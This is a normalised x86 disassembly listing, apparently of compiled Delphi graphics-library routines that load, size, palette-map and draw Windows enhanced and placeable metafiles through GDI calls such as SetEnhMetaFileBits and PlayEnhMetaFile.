call sub_4030d4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_41f614
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_41f614
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_41f614
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_41f614
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f578
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
add esp 0xfffffff0
call sub_403428
sub_41f614
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f697
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404bfc
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407b9c
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403ea8
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403ea8
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_413c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f69e
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_41f6a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_41f72f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407b9c
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_403eec
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_413d6c
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_404260
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f736
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_41f740
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_41f7be
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_413d6c
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403054
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4040b8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404260
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7c5
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41f7d0
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f94f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_403e54
mov eax [ ebp + 0x8 ]
call sub_403e54
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_403330
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f956
lea eax [ ebp - 0x3c ]
call sub_403e54
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_4059b8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408bf4
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40411c
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_40411c
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_408bf4
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_408bf4
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_4081ac
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_403ea8
sub_41fa1c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_41fac8
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_41fac8
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_41fac8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41fa9c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403104
mov eax [ esi + 0x8 ]
call sub_403104
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41fac8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_413c10
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fb0c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_413c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41fb70
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
call sub_41fb30
call sub_41fb50
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41fbb0
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4142fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_41fbe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40304c
mov edx eax
mov eax [ ebx + 0xc ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41440c
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_41fc14
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_403290
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403104
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403318
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403318
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403300
sub_41fc90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_41fd20
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403104
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40304c
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fd40
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fe64
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40840c
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4043b4
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f6a8
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push j_sub_4035a4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
mov eax [ ebx + 0xc ]
call sub_403104
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403318
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe6b
lea eax [ ebp - 0x14 ]
call sub_403e54
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_41fea4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_41fc90
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_41fc90
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414328
mov edx ebx
mov eax esi
call sub_41fc90
jmp r-xdata
pop esi
pop ebx
retn
sub_41ff00
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41ff24
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41ff4c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420053
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4040b8
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_41f740
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403104
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4035a4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42005a
lea eax [ ebp - 0x48 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_41ffda
mov eax [ ebp - 0x4 ]
call sub_403104
call sub_4038b8
call sub_40390c
mov eax [ ebx + 0xc ]
call sub_403104
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42005a
lea eax [ ebp - 0x48 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403318
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_420064
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403054
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402a08
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_4200c0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_42013c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41ff4c
mov eax [ ebp - 0x8 ]
push eax
push sub_420064
push ebp
call sub_4200c0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4201b8
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41be98
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_4201f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41f0b4
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_420240
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_421218
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4142fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_420270
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_421218
mov edx esi
mov eax ebx
call sub_414328
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_421214
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_420304
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41db3c
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41db3c
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41db3c
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41db3c
push eax
call SelectPalette
sub_42039c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420544
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_420400
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41be98
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_42048c
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_420544
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_4204f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420a6c
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4159c4
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_4206a8
mov edx esi
mov eax ebx
call sub_4205d8
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_420544
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_421218
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_421214
pop esi
pop ebx
retn
sub_42056c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_420a6c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_4206a8
mov edx esi
mov eax ebx
call sub_4205d8
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_4205d8
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_420544
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_415bf0
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026bc
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_420698
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028b8
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_415bf0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41de2c
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42069f
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4026dc
retn
call sub_41de2c
sub_4206a8
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_420544
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41de2c
lea eax [ ebp - 0x22 ]
call sub_41ec7c
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
